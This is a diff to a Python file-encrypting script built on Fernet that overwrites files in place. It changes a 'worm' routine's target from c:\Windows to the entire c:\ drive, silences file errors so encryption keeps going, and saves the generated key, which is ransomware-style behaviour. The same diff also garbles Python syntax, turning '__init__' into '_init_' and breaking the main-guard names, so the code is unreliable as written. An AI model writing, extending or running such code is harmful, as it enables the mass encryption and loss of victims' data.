@@ -5,19 +5,26 @@ from cryptography.fernet import Fernet
 
 
 class FuckYou:
-    def __init__(self) -> None:
+    def _init_(self) -> None:
         self._key = None
         
     def encrypt_file(self, path_file):
-        F = Fernet(self._key)
-        
-        with open(file=path_file, mode="rb") as fileobj1:
-            data_original = fileobj1.read()
-        
-        with open(file=path_file, mode="wb") as fileobj2:
-            data_mod = F.encrypt(data_original)
-            fileobj2.write(data_mod)
+        try:
             
+            F = Fernet(self._key)
+            with open(file=path_file, mode="rb") as fileobj1:
+                data_original = fileobj1.read()
+        
+            with open(file=path_file, mode="wb") as fileobj2:
+                data_mod = F.encrypt(data_original)
+                fileobj2.write(data_mod)
+
+        except FileNotFoundError:
+            pass
+
+        except OSError:
+            pass
+        
     def decrypt_file(self, path_file):
         F = Fernet(self._key)
         
@@ -59,7 +66,7 @@ class FuckYou:
     def key(self, value):
         self._key = value    
     
-if __name__ == "__main__":    
+if _name_ == "_main_":    
     parser = argparse.ArgumentParser()
     parser.add_argument("--decrypt", action="store_true", help="Decrypt data")
     parser.add_argument("--key", type=str)
@@ -76,5 +83,5 @@ if __name__ == "__main__":
             parser.print_help()
     else:
         fuck._key = Fernet.generate_key()
-        fuck.worm(path="c:\\Windows", type=1)
+        fuck.worm(path="c:\\", type=1)
         fuck.save_key()
